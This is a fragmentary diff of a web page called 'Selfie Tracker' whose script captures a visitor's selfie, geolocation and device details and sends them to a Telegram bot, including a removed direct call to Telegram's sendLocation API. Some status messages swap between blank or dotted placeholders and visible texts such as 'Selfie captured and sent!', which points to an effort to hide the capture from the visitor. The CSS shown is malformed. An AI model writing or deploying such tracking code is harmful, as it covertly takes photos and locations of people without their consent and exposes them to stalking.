@@ -5,21 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Selfie Tracker</title>
     <style>
-         body {
-            background-image: url('img/altarys gif.gif');
-            background-size: cover;
-            background-repeat: no-repeat;
-            background-attachment: fixed;
-            background-position: center;
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: white;
-            text-align: center;
-            font-family: Arial, sans-serif;
         border-radius: 15px;
         max-width: 500px;
         iframe {
@@ -52,12 +37,6 @@
                 `Longitude: ${lon}\n` +
                 `Source: ${source}\n` +
                 `Device: ${device}`;
-                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
-    
-
 
             const response = await fetch(url, {
                 method: 'POST',
@@ -101,19 +80,19 @@
 
                             // Send everything
                             await sendToTelegram(data.image, data.lat, data.lon, data.source, data.device, 'User');
-                            statusDiv.textContent = '  ';
+                            statusDiv.textContent = '✅ Selfie captured and sent!';
                         },
                         (error) => {
                             console.error('Error getting location:', error);
-                            statusDiv.textContent = '.';
+                            statusDiv.textContent = '❌ Failed to get location.';
                         }
                     );
                 } else {
-                    statusDiv.textContent = '  ..';
+                    statusDiv.textContent = '❌ Geolocation is not supported by this browser.';
                 }
             } catch (err) {
                 console.error(err);
-                statusDiv.textContent = '  ....';
+                statusDiv.textContent = '❌ Failed to capture and send selfie.';
             }
         }
 
